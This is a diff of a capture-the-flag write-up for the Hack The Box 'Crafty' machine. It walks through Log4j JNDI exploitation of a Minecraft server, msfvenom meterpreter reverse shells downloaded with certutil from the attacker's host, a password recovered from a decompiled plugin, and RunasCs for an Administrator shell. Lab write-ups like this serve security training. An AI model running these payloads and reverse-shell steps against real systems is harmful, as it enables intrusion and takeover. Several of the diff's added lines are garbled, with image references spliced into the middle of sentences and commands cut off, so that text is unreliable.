@@ -18,7 +18,7 @@ sudo nmap -p- -T5 -v 10.10.11.249
 
 The output will be:
 
-![[Pasted image /assets/img/posts/20250817005419-png.svg]]
+![](assets/img/posts/20250817005419-png-svg.svg))
 
 I need to add this to my hosts file: `/etc/hosts`
 ```
@@ -27,9 +27,7 @@ echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
 
 Lets navigate to the **crafty.htb**
 
-![](/assets/img/posts/020-crafty-easy-machine-004-png.svg)
-
-After running dirsearch on it, I found nothing
+![](/asset`020-crafty-easy-machine-004.png`nning dirsearch on it, I found nothing
 
 ### Exploitation & Gaining Access
 We didn't get anything from the port 80, so let target port 25565, and search for vulnerabilities in google: `minecraft 1.16.5 exploit github`
@@ -45,9 +43,7 @@ git clone <https://github.com/kozmer/log4j-shell-poc>
 ```
 And change the `String cmd` variable, to be windows compatible
 
-![](/assets/img/posts/020-crafty-easy-machine-005-png.svg)
-
-In order for `poc.py` to run, we need a java archive to be named `jdk1.8.0_20`. I found a java archive: https://repo.huaweicloud.com/java/jdk/8u181-b13
+![](/asset`020-crafty-easy-machine-005.png` for `poc.py` to run, we need a java archive to be named `jdk1.8.0_20`. I found a java archive: https://repo.huaweicloud.com/java/jdk/8u181-b13
 Copy it in the `log4j-shell-poc` directory
 
 grab java archive, then extract it
@@ -77,14 +73,14 @@ The LDAP server can now be setup to get ready for the log4j exploit
 python3 poc.py --userip 10.10.16.42 --webport 80 --lport 4444
 ```
 
-![[Pasted image /assets/img/posts/20250817005630-png.svg]]
+![](assets/img/posts/20250817005630-png-svg.svg))
 
 Now I can enter the link into pyCraft for the exploit the log4j vulnerability and grant myself a shell
 ```
 sudo python3 start.py -u abdo -s 10.10.11.249
 ```
 
-![[Pasted image /assets/img/posts/20250817005642-png.svg]]
+![](assets/img/posts/20250817005642-png-svg.svg))
 copy: `${jndi:ldap://10.10.16.42:1389/a}` from` poc.py` terminal, and paste it in `start.py` terminal, after we see **connected** word is appeared
 
 Setup a listener to catch our shell. I used `rlwrap`
@@ -92,7 +88,7 @@ Setup a listener to catch our shell. I used `rlwrap`
 sudo rlwrap nc -lvnp 4444
 ```
 
-![[Pasted image /assets/img/posts/20250817005727-png.svg]]
+![](assets/img/posts/20250817005727-png-svg.svg))
 
 We got a shell !
 
@@ -107,16 +103,14 @@ c:\users\svc_minecraft\Desktop>type user.txt
 ### Privilege Escalation
 After enumerating the machine, i ended to `\server\plugins` directory, and found a `playercounter-1.0-SNAPSHOT.jar` file . so we need to download it too see what it have for us
 
-![](/assets/img/posts/020-crafty-easy-machine-009-png.svg)
-
-I can't download the file with my current shell
+`020-crafty-easy-machine-009.png`ent shell
 
 so I'm going to try another way, lets generate a reverse shell
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4244 -f exe -o expl.exe 
 ```
 
-![[Pasted image /assets/img/posts/20250817005812-png.svg]]
+![](assets/img/posts/20250817005812-png-svg.svg))
 
 Then setup a Metasploit listener
 ```
@@ -138,25 +132,25 @@ certutil -urlcache -f http://10.10.16.42:4245/expl.exe %temp%/expl.exe
 start %temp%/expl.exe              # to run our reverse shell
 ```
 
-![[Pasted image /assets/img/posts/20250817005900-png.svg]]
+![](assets/img/posts/20250817005900-png-svg.svg))
 
 A meterpreter session should open on the Metasploit handler terminal
 
-![](/assets/img/posts/pasted-image-20260820182950-png.svg)
+![](assets/img/posts/pasted-image-20260820182950-png.svg))
 
-Now make sure that you're in the right directory, to download the `playercounter-1.0-SNAPSHOT.jar` file
+`pasted-image-20260820182950.png`oad the `playercounter-1.0-SNAPSHOT.jar` file
 
-![](/assets/img/posts/020-crafty-easy-machine-013-png.svg)
+![](assets/img/posts/020-crafty-easy-machine-013-png.svg))
 
-To open this `playercounter-1.0-SNAPSHOT.jar` file, we need a Java Decompiler `jd-gui` and it is built-in into kali
+`020-crafty-easy-machine-013.png`d a Java Decompiler `jd-gui` and it is built-in into kali
 
 So lets open the Decompiler and Click on File > Open File. Find the `playercounter-1.0-SNAPSHOT.jar` file and open it
 
-![[Pasted image /assets/img/posts/20250817005957-png.svg]]
+![](assets/img/posts/20250817005957-png-svg.svg))
 
 After reading the code, and analysis it in a hurry. This looks like a password: `s67u84zKq8IXw`
 
-![[Pasted image /assets/img/posts/20250817010010-png.svg]]
+![](assets/img/posts/20250817010010-png-svg.svg))
 
 Let's try remoting in with evil-winrm.
 ```
@@ -173,7 +167,7 @@ Now create another msfvenom payload but for another port 4246
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.42 LPORT=4246 -f exe -o expl2.exe
 ```
 
-![[Pasted image /assets/img/posts/20250817010041-png.svg]]
+![](assets/img/posts/20250817010041-png-svg.svg))
 
 On the meterpreter session you can try uploading to `\server\plugins` but it won't work because of permissions.
 
@@ -183,9 +177,7 @@ upload /home/kali/Desktop/HackTheBox/Crafty/expl2.exe
 upload /home/kali/Desktop/HackTheBox/Crafty/RunasCs.exe
 ```
 
-![](/assets/img/posts/020-crafty-easy-machine-018-png.svg){width="7.28125in" height="2.0416666666666665in"}
-
-Now open a new tab and fire up Metasploit, Then repeat the same steps. But this time on port: 4246
+`020-crafty-easy-machine-018.png`it, Then repeat the same steps. But this time on port: 4246
 I then fired up Metasploit and did the following
 ```
 msf6 > use multi/handler
@@ -197,23 +189,16 @@ msf6 exploit(multi/handler) > run
 
 In the current meterpreter session enter `shell` , which will drop you into the system command shell
 
-![](/assets/img/posts/020-crafty-easy-machine-019-png.svg)
+![](assets/img/posts/020-crafty-easy-machine-019-png.svg))
 
-Now `RunasCs.exe` which will establish an Administrator shell
-```
-.\RunasCs.exe Administrator s67u84zKq8IXw expl2.exe
+Now `RunasCs.exe` which will e`020-crafty-easy-machine-019.png`rator s67u84zKq8IXw expl2.exe
 ```
 
 You should see a shell pop up on our Metasploit listener
 
-![](/assets/img/posts/020-crafty-easy-machine-020-png.svg)
+![](assets/img/posts/020-crafty-easy-machine-020-png.svg))
 
-![](/assets/img/posts/020-crafty-easy-machine-021-png.svg)
-
-Then go to the desktop folder, to get the root flag
-```
-meterpreter > pwd
-meterpreter > cd ../../..
+`020-crafty-easy-machine-020.png`r,`020-crafty-easy-machine-021.png`cd ../../..
 meterpreter > pwd
 meterpreter > cd users
 meterpreter > cd administrator
